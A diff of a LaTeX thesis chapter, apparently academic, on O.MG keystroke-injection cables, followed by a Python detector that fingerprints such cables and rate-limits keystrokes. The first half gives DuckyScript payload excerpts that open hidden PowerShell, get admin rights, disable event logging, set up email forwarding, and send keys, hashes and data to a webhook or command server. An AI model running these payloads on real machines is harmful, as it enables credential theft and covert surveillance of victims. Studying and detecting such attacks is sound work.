@@ -10,14 +10,14 @@ The first part of this chapter will describe the implementation of the payloads 
 The payloads presented in this chapter have the following prerequisites:
 \begin{enumerate}
     \item Undisturbed input: while the payload is executing there may be no other HID input, especially no keypresses. A keypress will almost certainly throw off the execution of the payload, as will clicking, and especially switching focus to another window.
-    \item Windows: these payloads were written for Windows 11 with Powershell, it is not guaranteed that they will work on any other system.
+    \item Windows: these payloads were written for Windows 11 with PowerShell, it is not guaranteed that they will work on any other system.
     \item Unlocked state: the payloads in this paper assume that the target computer is not locked. However, the payload can include a few lines to unlock the computer, if the password is known. If it is not known, it can be found out if the O.MG cable is used to keylog an external keyboard on which the password is typed. 
     \item Known Keyboard language: These Payloads are written for a DE-CH layout but can be adjusted for any other layout. It is crucial that the layout set in the payload (default US) is the same as the layout language of the victim. If it is not known, the keymapper functionality of the keyboard can be used to determine it. 
 \end{enumerate}
 
 \subsection{Basics}
 
-Many payloads contain one or more common basic building blocks, namely opening application (mostly Powershell), getting admin rights, sending some data or how to close and application to cover up tracks.  \\
+Many payloads contain one or more common basic building blocks, namely opening an application (mostly PowerShell), getting admin rights, sending some data or how to close an application to cover up tracks.  \\
 This section will give a short overview over those use cases and how they can be implemented.
 
 
@@ -25,13 +25,13 @@ This section will give a short overview over those use cases and how they can be
 
 On Windows, there are several ways to open an application. This can be rather complicated, i.e. finding the executable in the files and running it, or simply searching it in the Windows search menu and accessing it from there. These are some of the ways in which applications can be opened;
 \begin{enumerate}
-    \item Running the executable requires intel on the victim's file structure. A more feasible alternative is the Windows run menu, which can be opened with the \textit{Windows key + r}. Here the name of the application can be entered, i.e. \textit{powershell} or \textit{powershell.exe}. Additionally, it can work with parameters, for example \textit{--incognito} can be used in combination with \textit{brave.exe} to open a private tab of the Brave browser. Or another example is opening Powershell with window style hidden:
-    \begin{lstlisting}[caption={Open powershell in a hidden window with Windows Run Menu},captionpos=b]
+    \item Running the executable requires intel on the victim's file structure. A more feasible alternative is the Windows run menu, which can be opened with the \textit{Windows key + r}. Here the name of the application can be entered, i.e. \textit{PowerShell} or \textit{PowerShell.exe}. Additionally, it can work with parameters, for example, \textit{--incognito} can be used in combination with \textit{brave.exe} to open a private tab of the Brave browser. Another example is opening PowerShell with window style hidden:
+    \begin{lstlisting}[caption={Open PowerShell in a hidden window with Windows Run Menu},captionpos=b]
     STRING GUI r
     STRINGLN powershell.exe -windowstyle hidden
     \end{lstlisting}
-    \item Many Windows system applications can be accessed through the Windows power menu, which is accessed with \textit{Windows key + x}. This menu can be navigated with tabs or letters; every option has one underlined letter, by pressing the corresponding key on the keyboard, that option is executed. As illustration the following implementation uses this approach to open Task Manager:
-    \begin{lstlisting}[caption={Open powershell with Windows Power User Menu}, captionpos=b]
+    \item Many Windows system applications can be accessed through the Windows power menu, which is accessed with \textit{Windows key + x}. This menu can be navigated with tabs or letters; every option has one underlined letter, by pressing the corresponding key on the keyboard, that option is executed. As an illustration, the following implementation uses this approach to open Task Manager:
+    \begin{lstlisting}[caption={Open PowerShell with Windows Power User Menu}, captionpos=b]
     STRING GUI x
     STRING t
     \end{lstlisting}
@@ -42,19 +42,19 @@ On Windows, there are several ways to open an application. This can be rather co
     DELAY 100
     ENTER
     \end{lstlisting}
-    \item Lastly, Windows has default and customizable shortcuts that can be used to open applications. Commonly known is, for example, \textit{ctrl + shift + escape} to open task manager. Application on the toolbar can similarly be opened through \textit{Windows key +} their index number. Assuming the attacker knows that the mail application is the first icon on the toolbar, they could run an payload that looks like this to open it:
+    \item Lastly, Windows has default and customizable shortcuts that can be used to open applications. Commonly known is, for example, \textit{ctrl + shift + escape} to open task manager. Application on the toolbar can similarly be opened through \textit{Windows key +} their index number. Assuming the attacker knows that the mail application is the first icon on the toolbar, they could run a payload that looks like this to open it:
     \begin{lstlisting}[caption={Open the first item on the toolbar}, captionpos=b]
     GUI + 1
     \end{lstlisting}
 \end{enumerate}
 
-In general it holds, as always, that the best choice is the fastest and most reliable one, which would be the run Windows option or the default shortcuts. Using the search menu creates time overhead and is a very obvious way of searching since the menu takes up such a big part of the screen. 
+In general, it holds, as always, that the best choice is the fastest and most reliable one, which would be the run Windows option or the default shortcuts. Using the search menu creates time overhead and is a very obvious way of searching since the menu takes up such a big part of the screen. 
 
 \subsubsection{Admin Rights}
 
-Acquiring admin rights is mainly an issue when trying to execute admin level command in Powershell. For these operations, Powershell should be run as administrator. \\
-The most straight forward approach for this is to use the power user menu and selecting Terminal (Admin) with the 'a' shortcut. If the current user is the administrator, a simple dialogue window will pop up to ask if the application should be allowed to make changes to the device. 'Yes' can be selected and Powershell will open run with administrator access. If the current user is not the administrator, the prompt will ask for the admin password. \\
-\begin{lstlisting}[caption={Open terminal wihh admin rights via the Power User Menu}, captionpos=b]
+Acquiring admin rights is mainly an issue when trying to execute admin-level commands in PowerShell. For these operations, PowerShell should be run as an administrator. \\
+The most straightforward approach for this is to use the power user menu and select Terminal (Admin) with the 'a' shortcut. If the current user is the administrator, a simple dialogue window will pop up to ask if the application should be allowed to make changes to the device. 'Yes' can be selected and PowerShell will open and run with administrator access. If the current user is not the administrator, the prompt will ask for the admin password. \\
+\begin{lstlisting}[caption={Open terminal with admin rights via the Power User Menu}, captionpos=b]
 GUI x
 DELAY 100
 STRINGLN a
@@ -64,10 +64,10 @@ DELAY 50
 ENTER
 \end{lstlisting}
 
-Another option is to search Powershell in the search menu and navigating to the option '\textit{Run as Administrator}' \\
-\begin{lstlisting}[caption={Open Powershell with admin rights via Search Menu}, captionpos=b]
+Another option is to search PowerShell in the search menu and navigate to the option '\textit{Run as Administrator}' \\
+\begin{lstlisting}[caption={Open PowerShell with admin rights via Search Menu}, captionpos=b]
 GUI
-STRING Powershell
+STRING PowerShell
 DELAY 300
 RIGHTARROW
 DELAY 50
@@ -77,8 +77,8 @@ ENTER
 
 \subsubsection{Closing applications}
 
-In Windows exists a little menu for every open window. It can be accessed by right clicking somewhere in the header of the window, or more simply having it focused and pressing the \textit{Alt} and \textit{Space} key on the keyboard simultaneously. \\
-The menu features the options '\textit{\underline{R}estore}', '\textit{\underline{M}ove}', '\textit{\underline{S}ize}', '\textit{Mi\underline{n}imize}', '\textit{Ma\underline{x}imize}', and '\textit{\underline{C}lose}'. The underlined letter in every option marks its shortcut. This can be used to minimize active windows or closing them after running a payload to cover one's tracks.
+In Windows exists a little menu for every open window. It can be accessed by right-clicking somewhere in the header of the window, or more simply having it focused and pressing the \textit{Alt} and \textit{Space} keys on the keyboard simultaneously. \\
+The menu features the options '\textit{\underline{R}estore}', '\textit{\underline{M}ove}', '\textit{\underline{S}ize}', '\textit{Mi\underline{n}imize}', '\textit{Ma\underline{x}imize}', and '\textit{\underline{C}lose}'. The underlined letter in every option marks its shortcut. This can be used to minimize active windows or close them after running a payload to cover one's tracks.
 \begin{lstlisting}[caption={Close a window through its window menu}, captionpos=b]
 ALT SPACE
 DELAY 50
@@ -91,18 +91,18 @@ ALT F4
 \end{lstlisting}
 \\
 
-An option specifically for closing Powershell windows is the shell keyword '\textit{exit}' :
-\begin{lstlisting} [caption={Close Powershell with the \textit{exit} keyword}, captionpos=b]
+An option specifically for closing PowerShell windows is the shell keyword '\textit{exit}' :
+\begin{lstlisting} [caption={Close PowerShell with the \textit{exit} keyword}, captionpos=b]
 STRINGLN exit
 \end{lstlisting}
 
 
 \subsubsection{Sending Recon to a Server}
 
-When gathering some information form the victim's laptop, the question arises how this information can be forwarded to the attacker. While there is a myriad for possibilities for this, ranging from physical attraction, to Bluetooth, to basic IP packets, this thesis will elaborate on two ways to send information using a connection to an internet network.
-One option to send out information is to send it to an already established server. The O.MG repository on GitHub features examples for sending intel to a Dropbox or discord server, sending via Teams, Email and more. The advantage of sending information over a frequently used communication channel like this, is that it looks very iconspicuous and will probably pass through firewalls.\\
+When gathering some information from the victim's laptop, the question arises of how this information can be forwarded to the attacker. While there is a myriad of possibilities for this, ranging from physical attraction to Bluetooth, to basic IP packets, this thesis will elaborate on two ways to send information using a connection to an internet network.
+One option to send out information is to send it to an already-established server. The O.MG repository on GitHub features examples for sending intel to a Dropbox or discord server, sending via Teams, Email and more. The advantage of sending information over a frequently used communication channel like this is that it looks very inconspicuous and will probably pass through firewalls.\\
 One example of sending an Extensible Markup Language (XML) object to a discord webhook given the webhook address and the content for the XML object:
-\begin{lstlisting}[caption=Send an XML object through Powershell}, captionpos=b]
+\begin{lstlisting}[caption=Send an XML object through PowerShell}, captionpos=b]
 STRING $xmlObject = [xml]$xmlContent
 ENTER
 STRING $Payload = @{xml = $xmlObject}
@@ -121,13 +121,13 @@ This approach would also be possible with a custom server by replacing the webho
 
 \subsubsection{Register Email Forwarding}
 
-This payload is UI based, since it is using outlook. The difficulty for using the command line, or any tool really, is that it is designed to work without knowing the user's password. So using the most widely used email client, Outlook, is a natural approach. \\
-The payload opens Outlook through the Windows search menu, waits a considerable amount of time to let it start up and then navigates to the correct menu. This is a good example for how tricky it can be to use the UI approach; every menu option that is selected, prompts a small load delay that has to be factor into the payload. Simply running all the navigation and selection without or with small delays only, can very swiftly derail the attack because the computer simply is not yet ready for the next command. \\
-Once the payload has navigated to the correct menu, it can select the email for which the forwarding should be selected and where the emails should be forwarded to. After that, it closes the menu. One important thing to know for this payload is that this action will prompt a little dialogue window in the top right corner when the application is opened for the first time after the settings change, reminding the user of the new forwarding. Therefore, in order to mask their steps, the attacker should restart outlook to close the message such that the victim has less chance of discovering the attack. \\
+This payload is UI based since it is using Outlook. The difficulty of using the command line, or any tool really, is that it is designed to work without knowing the user's password. So using the most widely used email client, Outlook, is a natural approach. \\
+The payload opens Outlook through the Windows search menu, waits a considerable amount of time to let it start up and then navigates to the correct menu. This is a good example of how tricky it can be to use the UI approach; every menu option that is selected prompts a small load delay that has to be factored into the payload. Simply running all the navigation and selection without or with small delays only, can very swiftly derail the attack because the computer simply is not yet ready for the next command. \\
+Once the payload has navigated to the correct menu, it can select the email for which the forwarding should be selected and where the emails should be forwarded. After that, it closes the menu. One important thing to know for this payload is that this action will prompt a little dialogue window in the top right corner when the application is opened for the first time after the settings change, reminding the user of the new forwarding. Therefore, to mask their steps, the attacker should restart Outlook to close the message such that the victim has less chance of discovering the attack. \\
 To illustrate this attack the following lines show some of the navigational steps:
 
 
-\begin{lstlisting} [caption={Example for navigation in a UI based payload: exceprt from navigating to Outlook Menu to change the email forwarding settings}, captionpos=b]
+\begin{lstlisting} [caption={Example for navigation in a UI-based payload: exceprt from navigating to Outlook Menu to change the email forwarding settings}, captionpos=b]
 DELAY 100
 DOWNARROW
 DELAY 100
@@ -168,7 +168,7 @@ This thesis presents two approaches to Windows event logging.
 \textbf{UI} 
 
 This implementation opens the Windows Event log application through the Windows Run window and navigates to the correct pane where it disables the logging.
-This approach mimics the action of a UI focused user. As explained in Section \ref{methodology} this has some drawbacks attached to it, namely the risk of unexpected UI behaviour and irregular loading times. This payload snippet exemplifies the approach of adding long delaysin between commands to ensure all actions are executed to completion before triggering the next command.\\
+This approach mimics the action of a UI-focused user. As explained in Section \ref{methodology} this has some drawbacks attached to it, namely the risk of unexpected UI behaviour and irregular loading times. This payload snippet exemplifies the approach of adding long delays between commands to ensure all actions are executed to completion before triggering the next command.\\
 The implementation of this payload contains a lot of tabs, due to the navigational nature. This is an excerpt for illustration:
 
 \begin{lstlisting}[caption={Exceprt: disable Windows Event Logging by navigating UI}, captionpos=b]
@@ -193,12 +193,12 @@ DELAY 2000
 
 \textbf{CLI}
 
-Using the Command Line for this attack does not have the same weaknesses as the UI approach. There is less chance for unexpected pop ups and since it is much shorter and requires fewer steps, loading times don't have as big an impact. On the other hand, executing admin level commands might pose a problem, as discussed in Section \ref{methodology} \\
+Using the Command Line for this attack does not have the same weaknesses as the UI approach. There is less chance for unexpected pop-ups and since it is much shorter and requires fewer steps, loading times don't have as big an impact. On the other hand, executing admin-level commands might pose a problem, as discussed in Section \ref{methodology} \\
 
-Once the admin problem has been navigated, the payload is straightforward and consists of entering to commands and closing the Powershell window.
-The CLI appraoch is more reliable and concise, however, it requires admin privileges for the shell. This can be achieved through the WinX menu, where the admin shell is opened directly. Then the payload consists only of a few more lines:
+Once the admin problem has been navigated, the payload is straightforward and consists of entering commands and closing the PowerShell window.
+The CLI approach is more reliable and concise, however, it requires admin privileges for the shell. This can be achieved through the WinX menu, where the admin shell is opened directly. Then the payload consists only of a few more lines:
 
-\begin{lstlisting}[caption={Exceprt: disable Windows Event Logging through Powershell}, captionpos=b]
+\begin{lstlisting}[caption={Exceprt: disable Windows Event Logging through PowerShell}, captionpos=b]
 STRINGLN Stop-Service -Name "eventlog"
 DELAY 200
 STRINGLN Set-Service -Name "eventlog" -StartupType Disabled
@@ -209,8 +209,8 @@ STRINGLN exit
 
 \subsubsection{Extract SSH hashes}
 
-Hash's associated keys, subkeys, and values make up a hive that can be exfiltrated from the Windows system by storing it in a file and the sending that file to a command server. \\
-Once admin privileges on a terminal have been secured, this is a straight forward process. 
+Hash's associated keys, subkeys, and values make up a hive that can be exfiltrated from the Windows system by storing it in a file and sending it to a command and control (C\&C) server. \\
+Once admin privileges on a terminal have been secured, this is a straightforward process. 
 
 
  \begin{lstlisting} [caption={Exceprt: extract and SSH files}, captionpos=b]
@@ -219,7 +219,7 @@ Once admin privileges on a terminal have been secured, this is a straight forwar
 
 \subsubsection{Extract Private Key Files}
 
-File extensions can be searched with the help of Powershell. For that reason, this extraction payload will run a simple loop on a predefined (default) path to a directory that is expected to contain private key files and send the discovered files to a command server. 
+File extensions can be searched with the help of PowerShell. For that reason, this extraction payload will run a simple loop on a predefined (default) path to a directory that is expected to contain private key files and send the discovered files to a command server. 
 
 \begin{lstlisting}[caption={Exceprt: search for private key files by their file extension}, captionpos=b]
 DUCKY_LANG DE_CH
@@ -247,7 +247,7 @@ DELAY 200
 
 \subsubsection{Steal Web Session Cookies}
 
-A client's default browser can be extracted via Powershell using only one line:
+A client's default browser can be extracted via PowerShell using only one line:
 \begin{lstlisting}[caption={Exceprt: Find a target's default browser}, captionpos=b]
 STRINGLN Get-ItemProperty -Path 'HKCU: Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' | Select-Object -ExpandProperty ProgId
 \end{lstlisting}
@@ -258,7 +258,7 @@ After that information is sent back to the attacker, they can connect to the cab
 STRINGLN cd "C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\umva4gfp.default-release\cookies.sqlite"
 \end{lstlisting}
 
-The same approach can be used for chrome, the difference is in the file path.
+The same approach can be used for Chrome, the difference is in the file path.
 
 \begin{lstlisting}[caption={move into the directory for Chrome cookies}, captionpos=b]
 STRINGLN cd "C:\Users\maaik\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
@@ -266,10 +266,10 @@ STRINGLN cd "C:\Users\maaik\AppData\Local\Google\Chrome\User Data\Default\Networ
 
 \subsubsection{Iteratively End Processes}
 
-Finding and ending processes on Windows can be done with Powershell and without admin privileges. The payload first defines the black- or whitelist, depending on the mode of the attack, then gets a list of all running processes. Next, it will either end all running processes that are also in the whitelist, or it will end every running process that is not in the blacklist. \\
+Finding and ending processes on Windows can be done with PowerShell and without admin privileges. The payload first defines the black- or whitelist, depending on the mode of the attack, then gets a list of all running processes. Next, it will either end all running processes that are also on the whitelist, or it will end every running process that is not on the blacklist. \\
 This is an excerpt of the whitelist mode;
 
-\begin{lstlisting}[caption={Exceprt: a Powershell looop that ends a running process if it is contained in the whitelist}, captionpos=b]
+\begin{lstlisting}[caption={Exceprt: a PowerShell looop that ends a running process if it is contained in the whitelist}, captionpos=b]
 STRINGLN $criticalProcessesWhitelist = @( "firefox" , "ROCCAT_Swarm_Monitor", "Notepad" )
 DELAY 5
 STRINGLN while("true"){
@@ -293,19 +293,19 @@ DELAY 5
 STRINGLN }
 \end{lstlisting}
 
-The program features a while loop, which will keep it running continuously. It also includes a sleep to give the operating system time to actually terminate a process, before running Get-Process again thereby avoiding attention drawing error messages. In order for this payload to run, the name in the white- or blacklist must match exactly what the process name is that is returned by the Get-Process Powershell function. 
+The program features a while loop, which will keep it running continuously. It also includes a sleep to give the operating system time to actually terminate a process, before running Get-Process again thereby avoiding attention-drawing error messages. For this payload to execute, the name specified in the white- or blacklist must exactly match the process name returned by the Get-Process PowerShell function.
 
 
 
 \subsubsection{Schedule Processes}
 
-Windows Processes can be scheduled via Powershell with admin privileges. As soon as that is achieved, a job trigger can be chosen. There is a wide variety to chose from, such as time intervals in seconds, minutes, days, even weeks, random delays, repetition for a set duration, or events such as logon or start up \cite{sdwheelerNewJobTriggerPSScheduledJobPowerShell}.
+Windows Processes can be scheduled via PowerShell with admin privileges. As soon as that is achieved, a job trigger can be chosen. There is a wide variety to choose from, such as time intervals in seconds, minutes, days, even weeks, random delays, repetition for a set duration, or events such as logon or start-up \cite{sdwheelerNewJobTriggerPSScheduledJobPowerShell}.
 For the purpose of this demonstration, logon is used. \\
-Similarly, some job options can also be configured, they can be things like '-ContinueIfGoingOnBattery' , -HideInTaskScheduler, -IdleTimeout (how long is the computer idle before the job starts), -RequireNetwork, and many more \cite{sdwheelerSetScheduledJobOptionPSScheduledJobPowerShell}. \\
-After these settings have been defined, the job itself is registered and the Powershell window can be closed. \\
+Similarly, some job options can also be configured, they can be things like '-ContinueIfGoingOnBattery', -HideInTaskScheduler, -IdleTimeout (how long is the computer idle before the job starts), -RequireNetwork, and many more \cite{sdwheelerSetScheduledJobOptionPSScheduledJobPowerShell}. \\
+After these settings have been defined, the job itself is registered and the PowerShell window can be closed. \\
 
 
-\begin{lstlisting}[caption={Excerpt: register a scheduled job via Powershell}, captionpos=b]
+\begin{lstlisting}[caption={Excerpt: register a scheduled job via PowerShell}, captionpos=b]
 DELAY 2000
 STRINGLN $trigger = New-JobTrigger -AtLogon
 DELAY 200
@@ -319,23 +319,23 @@ DELAY 200
 \section{Defence}
 
 In this section, the implementation of the defence strategies outlined in chapter \ref{Methodology} will be discussed. First, the classes will be presented, the USB capture process, then how the packets are analyzed and lastly the rate limiter implementation. 
-This implementation is written in python for no good reason other than that that's what i know to use for data analyis and i did not want to spend the time for this thesis on learning c\# (TODO find better reason)
+This implementation is written in Python.
 
 \subsection{Dependencies}
 
-For the script to run it is impotrant that all the dependencies mentioned in chapter \ref{Methodology} are installed and working. Those are namely Wireshark with tshark, USBPcap and USBDeview. For USBDeview specifically it is important that the file location is known such that it can be passed to the script as described in sub section \ref{Usage and Command Line Argumets}.
+For the script to run all the dependencies mentioned in chapter \ref{Methodology} must be installed and working. Those are namely Wireshark with Tshark, USBPcap and USBDeview. For USBDeview specifically, the file location must be known such that it can be passed to the script as described in sub-section \ref{Usage and Command Line Argumets}.
 
 
 
 \subsection{Usage and Command Line Argumets} \label{Usage and Command Line Argumets}
 
-The script can be started via command line and supports some customization. Specifically it is required to input the absolute path to the USBdeview installation. For the rate limiter functionality as discused in section \ref{Methodology} there are a few options the user can choose from. They can opt out of rate limiting and only make use of the enumeration analysis the script provides by using the -r flag, or they can choose between either option for monitoring the rate of input. For Time Windows Analysis the flag \verb|--time-window| has to be set that takes as argument a string of "(time window in seconds, allowed keystrokes)". The other option is chosing interarrival time anaylsis with the \verb|--interarrival_time| and the specifications "(interarrival time, average over n keystrokes)". \\
-These inputs are checked at the beginning of the script to ensure that every necessary information is available and no impossible combination of flags is set. For example it should not be possible to set both 
+The script can be started via the command line and supports some customization. Specifically, it is required to input the absolute path to the USBDeview installation. For the rate limiter functionality as discussed in section \ref{Methodology} there are a few options the user can choose from. They can opt out of rate limiting and only make use of the enumeration analysis the script provides by using the -r flag, or they can choose between either option for monitoring the rate of input. For Time Windows Analysis the flag \verb|--time-window| has to be set that takes as argument a string of "(time window in seconds, allowed keystrokes)". The other option is choosing interarrival time analysis with the \verb|--interarrival_time| and the specifications "(interarrival time, average over n keystrokes)". \\
+These inputs are checked at the beginning of the script to ensure that every necessary information is available and no impossible combination of flags is set. For example, it should not be possible to set both 
 \verb|--interarrival_time --time-window| or to set either without their specifications. 
 
 This is the help message for the detection script:
 
- TODO; adjust this to final version
+ TODO; adjust this to the final version
 \begin{lstlisting}
   -h, --help            show this help message and exit
   -i INTERARRIVAL_TIME, --interarrival_time INTERARRIVAL_TIME
@@ -371,7 +371,7 @@ class USBDevice:
         self.registered_keypresses = deque()
 \end{lstlisting}
 
-The USB device class stores identity information like name, pid, vid, interfaces, the source port as assigned by the host and a list of registered keypress from that source.
+The USB device class stores identity information like name, PID, VID, interfaces, the source port as assigned by the host and a list of registered keypress from that source.
 
 \begin{lstlisting}
 class Frame:
@@ -386,7 +386,7 @@ class Frame:
         self.isInterfaceDescriptorPacket: bool = False
 \end{lstlisting}
 
-Important information for frames are their source and destination, what kind of function the frame has (URB_function), whether it is a device descriptor packet or an interface descriptor packet, and if available, the HID data it carries.
+Important information for frames are their source and destination, what kind of function the frame has (URB\_function), whether it is a device descriptor packet or an interface descriptor packet, and if available, the HID data it carries.
 
 
 \subsection{Packet Capturing}
@@ -398,34 +398,34 @@ After this index is acquired, Tshark is run with \verb|tshark -i {index} -V|. \v
 
 \subsection{Information Extraction}
 
-The output relayed from tshark is analyzed line by line. The beginning of a frame is marked by a substring matching the pattern \verb|Frame\s\d+:|. With this knowledge, every line after can be addedas the content to the Frame and analyzed for information it's context. \\ 
-All information is extracted from the stream of output lines like this by searching for the keywords that announce the information. After finding a frame line for instance, the program will check the line for the presence of another marker like "[Source:" or "[Destination:". The bmAttributes, who specify the remote wakeup and self power attribtues of a USB device, bString, which is the device's name, HID data (for example which key was pressed) and the function (URB FUnction) of the frame are found the same way. After their extraction, they are stored in the a Frame instance stored under the current_frame variable. \\
+The output relayed from Tshark is analyzed line by line. The beginning of a frame is marked by a substring matching the pattern \verb|Frame\s\d+:|. With this knowledge, every line after can be stored in the content attribute of the Frame and later be analyzed for information. \\ 
+All information is extracted from the stream of output lines like this by searching for the keywords that announce the information. After finding a frame line for instance, the program will check the line for the presence of another marker like "[Source:" or "[Destination:". The bmAttributes, which specify the remote wakeup and self-power attributes of a USB device, bString, which is the device's name, HID data (for example which key was pressed) and the function (URB\ Function) of the frame are found in the same way. After their extraction, they are stored in the Frame instance stored under the current\_frame variable. \\
 If the frame is a device or an interface descriptor it is detected through the presence of the respective substring. However, because the information that is stored in these frames is distributed over multiple lines that have not yet arrived by the time the 'INTERFACE DESCRIPTOR' or 'DEVICE DESCRIPTOR'  lines are examined. For this reason, the Frame has to be analyzed again, once all of its content has arrived. So, when a new Frame starts the program first checks whether the previous frame was marked as interface or device descriptor and if that is the case, it will call a helper method to extract the missing information. \\
-Per the definition of the USB protocol, a device descriptor frame will be sent before an interface descriptor or any of the other device specific information like bStrings and bmAttributes. A device descriptor packet therefore triggers a device registration, wherein a new USBDevice instance is created and populated with the device descriptor information, such as the vendor and product ID, the device class and the device protocol. The Device is then stored in a device dictionary to make sure it can be accessed again to store and retrieve information. The unique key for every device in this dictionary is the bus and port where it is registered on the host. These are assigned at the very beginning of the enumeration process before any communication takes place, as described in section \ref{TheUSBProtocol}. Since the host too has to have a reliable way to keep all devices apart, no two devices ever share a source. The same machanism happens for interface descriptors, except that their source device should already be registred in the program and can be retrieved by the source of the frame. The interface class and interface protocol are extracted from the frame content and added to the USBDevice class.\\
+Per the definition of the USB protocol, a device descriptor frame will be sent before an interface descriptor or any of the other device-specific information like bStrings and bmAttributes. A device descriptor packet therefore triggers a device registration, wherein a new USBDevice instance is created and populated with the device descriptor information, such as the vendor and product ID, the device class and the device protocol. The Device is then stored in a device dictionary to make sure it can be accessed again to store and retrieve information. The unique key for every device in this dictionary is the bus and port where it is registered on the host. These are assigned at the very beginning of the enumeration process before any communication takes place, as described in section \ref{TheUSBProtocol}. Since the host too has to have a reliable way to keep all devices apart, no two devices ever share a source. The same mechanism happens for interface descriptors, except that their source device should already be registered in the program and can be retrieved by the source of the frame. The interface class and interface protocol are extracted from the frame content and added to the USBDevice class.\\
 Devices also have to be deregistered when they disconnect in order to not mess up the index of connected devices. A disconnect can be detected by the URB function \verb|URB_FUNCTION_ABORT_PIPE|. If it is detected, the source from which it is sent is deleted from the dictionary of registered devices.
 
 
 \subsection{O.MG detection}
 
-As previously mentioned in section \ref{Packet Analysis}, O.MG cables have a unique enumeration fingerprint. Although they register as Keyboards, they do not support remote wakeup, one crucial feature of human interface devices. On top of that, O.MG cables have a default for their bStrings which is 'O.MG' which although it can be changed, is still a clear indicator for the O.MG cable if it appears. Either information is extracted as soon as it appears in a packet. The substring ""Configuration bmAttributes" triggers the extraction of the remote wakeup and self power properties of a device. At the end of that process is a function call to a method called CheckForOMG. Since the bmAttributes are specified after the device and interface desriptors, extensive information about the source USB device should already be present. Should the program conclude, that although the device is registered as a keyboard it does not support remote wakeup, a disconnection process is triggered. The same happens, if the bString of the device is set to 'O.MG'. \\
-Disabling or disconnecting a USB device is done with the help of the USBDeview utility \cite{ViewAnyInstalled}. USBDeview is a small utility developed by Nir Sofer. It is mainly a tool that provides a UI overview over all connected USB devices and their information. On top of that it is also allows disconnecting USB devices as identified by their product and vendor IDs. This functionality can be used in a terminal. The program therefore starts a subprocess, switched to the directory where USBDeview is stored and issues the disconnect command with the PID and VID as stored in the USBDevice class.
+As previously mentioned in section \ref{Packet Analysis}, O.MG cables have a unique enumeration fingerprint. Although they register as Keyboards, they do not support remote wakeup, one crucial feature of human interface devices. On top of that, O.MG cables have a default for their bStrings which is 'O.MG' which although it can be changed, is still a clear indicator for the O.MG cable if it appears. Either information is extracted as soon as it appears in a packet. The substring "Configuration bmAttributes" triggers the extraction of the remote wakeup and self-power properties of a device. At the end of that process is a function call to a method called CheckForOMG. Since the bmAttributes are specified after the device and interface descriptors, extensive information about the source USB device should already be present. Should the program conclude, that although the device is registered as a keyboard it does not support remote wakeup, a disconnection process is triggered. The same happens if the bString of the device is set to 'O.MG'. \\
+Disabling or disconnecting a USB device is done with the help of the USBDeview utility \cite{ViewAnyInstalled}. USBDeview is a small utility developed by Nir Sofer. It is mainly a tool that provides a UI overview of all connected USB devices and their information. On top of that, it also allows disconnecting USB devices as identified by their product and vendor IDs. This functionality can be used in a terminal. The program therefore starts a subprocess, switches to the directory where USBDeview is stored and issues the disconnect command with the PID and VID as stored in the USBDevice class.
 
 \subsection{Rate Limiter}
 
-Everytime a key is pressed, a total of four frames are exchanged between the host and the keyboard. The first frame is generated by the keyboard and signals to the device that a key is pressed. This is followed by the host with an acknowledgement. The third frame is the key release package signalling that the pressed key was also released. If the key had been pressed continuously, the amount of characters that would have been generated would be deducted from the time between the first keypress package and the release package. The release package can be distinguished from the key press package by the content of it's HID data which is not the HID code for any possible input but instead just 16 zeroes. \\
-These keypress packages are of URB function type \verb|URB_FUNCTION_BULK_OR_INTERRUPT_TRANSFER|. Every time such a package is received, the rate limiter method is called. However, packages with this function are also sent during the enumeration process, where they do not signal keyboard input. In order to distuinguish those packets, the HID payload for the frames has to be known. Bulk or interrupt transfer packages from the enumeration process do not carry HID data. For this reason, the rate limiter method can only be called once the entire package and its optional HID payload was received. This puts this check in the same category as the device descriptor and interface frames that are evaluated after the entire frame was received. Once the program detects the start of a new frame when the previous one was a urb funtion bulk or interrupt frame, it calls the rate limiter method. That method first ignores all packages that are sent from the host or any devices that are not registered as a keyboard. Then it ignores all packages of that UBR type that do not have HID data, these kinds of packages are part of the enumeration process and do not represent actual keyboard input. Lastly it will also disregard keypress release packages. \\
+Every time a key is pressed, a total of four frames are exchanged between the host and the keyboard. The first frame is generated by the keyboard and signals to the device that a key is pressed. This is followed by the host with an acknowledgement. The third frame is the key release package signalling that the pressed key was also released. If the key is pressed continuously, the exact amount of characters is deducted from the time elapsed time between the keypress package and the release package. The release package can be distinguished from the key press package by the content of its HID data which is not the HID code for any possible input but instead just 16 zeroes. \\
+These keypress packages are of URB function type \verb|URB_FUNCTION_BULK_OR_INTERRUPT_TRANSFER|. Every time such a package is received, the rate limiter method is called. However, packages with this function are also sent during the enumeration process, where they do not signal keyboard input. In order to distinguish those packets, the HID payload for the frames has to be known. Bulk or interrupt transfer packages from the enumeration process do not carry HID data. For this reason, the rate limiter method can only be called once the entire package and its optional HID payload have been received. This puts this check in the same category as the device descriptor and interface frames that are evaluated after the entire frame has been received. When the program detects the start of a new frame following a previous URB function bulk or interrupt frame, it triggers the rate limiter method. That method first ignores all packages that are sent from the host or any devices that are not registered as a keyboard. Then it ignores all packages of that UBR type that do not have HID data, these kinds of packages are part of the enumeration process and do not represent actual keyboard input. Lastly, it will also disregard keypress release packages. \\
 
-After these filters have been applied, the actual rate limiting mechanism can begin. As discussed in section \ref{Methodology} Methodology multiple appraoches are possible, each with their own pros and cons. \\
-
-
-First we will look at the number of keystrokes over time. The two variable factors for this are the number of keypresses n that will define the threshold and the time s over which they are measured. 
-Upon the arrival of a Frame that was identified as a keystroke and passed all the previously mentioned filters, a timestampt is recorded. This timestampt is then added to a queue attribute on the USBDevice class, called \verb|registered_keypresses|. Next the script iterates through the timestamps in that queue and removes all the keypresses that happened before the consdidered time window: if timestmap < current time - time window t it is removed from the queue. If the length of the queue is above the threshold for keystrokes n after all the entries have been checked for relevance, then more than the allowed number of keystrokes were recorded within the time window and the rate limit is exceeded. The \verb|disable_device()| method is called to disconnect the device and make sure suspected attack is interrupted. The effectiveness of different values for n and s will be discussed in section TODO. 
+After these filters have been applied, the actual rate-limiting mechanism can begin. As discussed in section \ref{Methodology} Methodology multiple approaches are possible, each with their pros and cons. \\
 
 
